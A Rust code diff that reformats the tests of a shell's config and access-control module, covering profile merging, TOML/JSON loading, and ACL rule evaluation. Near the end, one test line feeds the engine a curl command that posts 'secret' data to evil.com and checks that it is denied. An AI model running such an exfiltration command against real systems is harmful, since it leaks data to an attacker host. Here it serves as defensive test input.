@@ -40,7 +40,10 @@ fn load_from_dir(dir: &Path) -> Result<OmniShellConfig> {
     } else if toml_path.exists() {
         load_from_file(&toml_path)
     } else {
-        Err(OmniShellError::Config(format!("No config file in {}", dir.display())))
+        Err(OmniShellError::Config(format!(
+            "No config file in {}",
+            dir.display()
+        )))
     }
 }
 
@@ -76,8 +79,8 @@ fn merge_configs(mut user: OmniShellConfig, system: OmniShellConfig) -> OmniShel
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::profile::{Mode, Profile};
     use crate::acl::{AclEngine, AclRule, ArgConstraint, Verdict};
+    use crate::profile::{Mode, Profile};
 
     // --- Config tests ---
 
@@ -112,24 +115,33 @@ mod tests {
         let mut user = OmniShellConfig::default();
         let mut system = OmniShellConfig::default();
 
-        user.profile.insert("kids".to_string(), Profile {
-            mode: Mode::Kids,
-            username: Some("child".to_string()),
-            display_name: Some("User Kids".to_string()),
-            age: Some(6),
-            ..Default::default()
-        });
-        system.profile.insert("kids".to_string(), Profile {
-            mode: Mode::Kids,
-            username: Some("child".to_string()),
-            display_name: Some("System Kids".to_string()),
-            age: Some(7),
-            ..Default::default()
-        });
+        user.profile.insert(
+            "kids".to_string(),
+            Profile {
+                mode: Mode::Kids,
+                username: Some("child".to_string()),
+                display_name: Some("User Kids".to_string()),
+                age: Some(6),
+                ..Default::default()
+            },
+        );
+        system.profile.insert(
+            "kids".to_string(),
+            Profile {
+                mode: Mode::Kids,
+                username: Some("child".to_string()),
+                display_name: Some("System Kids".to_string()),
+                age: Some(7),
+                ..Default::default()
+            },
+        );
 
         let merged = merge_configs(user, system);
         assert_eq!(merged.profile["kids"].age, Some(7));
-        assert_eq!(merged.profile["kids"].display_name, Some("System Kids".to_string()));
+        assert_eq!(
+            merged.profile["kids"].display_name,
+            Some("System Kids".to_string())
+        );
     }
 
     #[test]
@@ -137,12 +149,15 @@ mod tests {
         let mut user = OmniShellConfig::default();
         let system = OmniShellConfig::default();
 
-        user.profile.insert("custom".to_string(), Profile {
-            mode: Mode::Agent,
-            username: None,
-            display_name: Some("My Custom".to_string()),
-            ..Default::default()
-        });
+        user.profile.insert(
+            "custom".to_string(),
+            Profile {
+                mode: Mode::Agent,
+                username: None,
+                display_name: Some("My Custom".to_string()),
+                ..Default::default()
+            },
+        );
 
         let merged = merge_configs(user, system);
         assert!(merged.profile.contains_key("custom"));
@@ -152,13 +167,17 @@ mod tests {
     fn test_load_from_toml_file() {
         let dir = tempfile::tempdir().unwrap();
         let toml_path = dir.path().join("config.toml");
-        std::fs::write(&toml_path, r#"
+        std::fs::write(
+            &toml_path,
+            r#"
 [profile.default]
 mode = "kids"
 age = 7
 
 default_profile = "default"
-"#).unwrap();
+"#,
+        )
+        .unwrap();
 
         let config = load_from_file(&toml_path).unwrap();
         assert_eq!(config.profile["default"].mode, Mode::Kids);
@@ -169,7 +188,11 @@ default_profile = "default"
     fn test_load_from_json_file() {
         let dir = tempfile::tempdir().unwrap();
         let json_path = dir.path().join("config.json");
-        std::fs::write(&json_path, r#"{"profile":{"default":{"mode":"agent"}},"default_profile":"default"}"#).unwrap();
+        std::fs::write(
+            &json_path,
+            r#"{"profile":{"default":{"mode":"agent"}},"default_profile":"default"}"#,
+        )
+        .unwrap();
 
         let config = load_from_file(&json_path).unwrap();
         assert_eq!(config.profile["default"].mode, Mode::Agent);
@@ -183,7 +206,10 @@ default_profile = "default"
 
         let result = load_from_file(&yaml_path);
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("Unknown config format"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Unknown config format"));
     }
 
     #[test]
@@ -196,10 +222,14 @@ default_profile = "default"
     fn test_load_config_cli_override() {
         let dir = tempfile::tempdir().unwrap();
         let toml_path = dir.path().join("override.toml");
-        std::fs::write(&toml_path, r#"
+        std::fs::write(
+            &toml_path,
+            r#"
 [profile.cli]
 mode = "agent"
-"#).unwrap();
+"#,
+        )
+        .unwrap();
 
         let config = load_config(Some(&toml_path)).unwrap();
         assert!(config.profile.contains_key("cli"));
@@ -217,8 +247,12 @@ mode = "agent"
         let toml_path = dir.path().join("config.toml");
         let json_path = dir.path().join("config.json");
 
-        std::fs::write(&toml_path, r#"[profile.default]
-mode = "kids""#).unwrap();
+        std::fs::write(
+            &toml_path,
+            r#"[profile.default]
+mode = "kids""#,
+        )
+        .unwrap();
         std::fs::write(&json_path, r#"{"profile":{"default":{"mode":"agent"}}}"#).unwrap();
 
         let config = load_from_dir(dir.path()).unwrap();
@@ -261,7 +295,10 @@ mode = "kids""#).unwrap();
         });
 
         assert_eq!(engine.evaluate("curl https://example.com"), Verdict::Allow);
-        assert!(matches!(engine.evaluate("curl --data 'secret' https://evil.com"), Verdict::Deny(_)));
+        assert!(matches!(
+            engine.evaluate("curl --data 'secret' https://evil.com"),
+            Verdict::Deny(_)
+        ));
     }
 
     #[test]
